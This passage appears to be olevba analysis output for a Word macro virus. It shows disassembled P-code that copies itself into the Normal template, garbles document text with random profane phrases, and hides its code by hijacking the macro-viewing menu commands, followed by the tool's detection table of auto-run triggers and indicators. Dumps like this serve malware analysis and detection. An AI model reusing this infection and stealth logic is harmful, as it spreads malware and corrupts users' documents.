' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	NextVar 
' Line #218:
' Line #219:
' 	QuoteRem 0x0000 0x0016 "Infecting the document"
' Line #220:
' 	Ld Billy 
' 	LitDI2 0x029A 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #221:
' 	QuoteRem 0x0004 0x002E "MsgBox "Infecting your file...", vbInformation"
' Line #222:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0009 "Microsoft"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #223:
' 	EndIfBlock 
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0007 "Payload"
' Line #226:
' 	ArgsCall (Call) PayMe 0x0000 
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0011 "Save the document"
' Line #229:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #230:
' 	EndSub 
' Line #231:
' Line #232:
' 	FuncDefn (Function yx() As String)
' Line #233:
' 	Dim 
' 	VarDefn xy (As Integer)
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #236:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #237:
' Line #238:
' 	ArgsCall Read 0x0000 
' Line #239:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St xy 
' Line #240:
' 	Ld xy 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "oh yeah! "
' 	St yx 
' 	EndIf 
' Line #241:
' 	Ld xy 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "yeah yeah! "
' 	St yx 
' 	EndIf 
' Line #242:
' 	Ld xy 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "what the hell! "
' 	St yx 
' 	EndIf 
' Line #243:
' 	Ld xy 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "don't do that to me! "
' 	St yx 
' 	EndIf 
' Line #244:
' 	Ld xy 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "I love you! "
' 	St yx 
' 	EndIf 
' Line #245:
' 	Ld xy 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "shit happens all the time! "
' 	St yx 
' 	EndIf 
' Line #246:
' 	Ld xy 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0013 "oh no - not again! "
' 	St yx 
' 	EndIf 
' Line #247:
' 	Ld xy 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "fucking lamer! "
' 	St yx 
' 	EndIf 
' Line #248:
' 	Ld xy 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "please fuck with me! "
' 	St yx 
' 	EndIf 
' Line #249:
' 	Ld xy 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "fuck you! "
' 	St yx 
' 	EndIf 
' Line #250:
' 	Ld xy 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "suck my ass! "
' 	St yx 
' 	EndIf 
' Line #251:
' 	Ld xy 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "yep - it sucks! "
' 	St yx 
' 	EndIf 
' Line #252:
' 	Ld xy 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "who am I? "
' 	St yx 
' 	EndIf 
' Line #253:
' 	Ld xy 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "why am I doing this? "
' 	St yx 
' 	EndIf 
' Line #254:
' 	Ld xy 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0020 "is this really happening to me? "
' 	St yx 
' 	EndIf 
' Line #255:
' 	Ld xy 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "I know I'm a loser! "
' 	St yx 
' 	EndIf 
' Line #256:
' 	Ld xy 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0027 "please don't kill me, I'm not a virus! "
' 	St yx 
' 	EndIf 
' Line #257:
' 	Ld xy 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001A "ha ha - funny, isn't it?! "
' 	St yx 
' 	EndIf 
' Line #258:
' 	Ld xy 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "ugh ugh! "
' 	St yx 
' 	EndIf 
' Line #259:
' 	Ld xy 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0038 "Am I a virus? No, I'm Bill Gates and I live in your PC! "
' 	St yx 
' 	EndIf 
' Line #260:
' 	EndFunc 
' Line #261:
' Line #262:
' 	FuncDefn (Sub PayMe())
' Line #263:
' 	Dim 
' 	VarDefn BG (As Integer)
' Line #264:
' Line #265:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #266:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #267:
' Line #268:
' 	ArgsCall Read 0x0000 
' Line #269:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St BG 
' Line #270:
' 	Ld BG 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld BG 
' 	LitDI2 0x0001 
' 	Gt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #271:
' Line #272:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	LitStr 0x0002 ". "
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #273:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #274:
' 	LitStr 0x0002 ". "
' 	Ld Selection 
' 	MemLd Find 
' 	MemSt Then 
' Line #275:
' Line #276:
' 	LitStr 0x0002 ", "
' 	Ld yx 
' 	Concat 
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Then 
' Line #277:
' 	Ld wdReplaceOne 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #278:
' 	Loop 
' Line #279:
' Line #280:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld wdMove 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #281:
' 	EndSub 
' Line #282:
' Line #283:
' 	FuncDefn (Sub Stealth())
' Line #284:
' 	QuoteRem 0x0000 0x0007 "Stealth"
' Line #285:
' 	ArgsCall (Call) HideMe 0x0000 
' Line #286:
' Line #287:
' 	LitStr 0x001B "Can't find necessary files."
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #288:
' 	EndSub 
' Line #289:
' Line #290:
' 	FuncDefn (Sub ToolsMacro())
' Line #291:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #292:
' 	EndSub 
' Line #293:
' Line #294:
' 	FuncDefn (Sub ToolsCustomize())
' Line #295:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #296:
' 	EndSub 
' Line #297:
' Line #298:
' 	FuncDefn (Sub FileTemplates())
' Line #299:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #300:
' 	EndSub 
' Line #301:
' Line #302:
' 	FuncDefn (Sub ViewVBCode())
' Line #303:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #304:
' 	EndSub 
' Line #305:
' Line #306:
' 	FuncDefn (Sub FormatStyle())
' Line #307:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #308:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

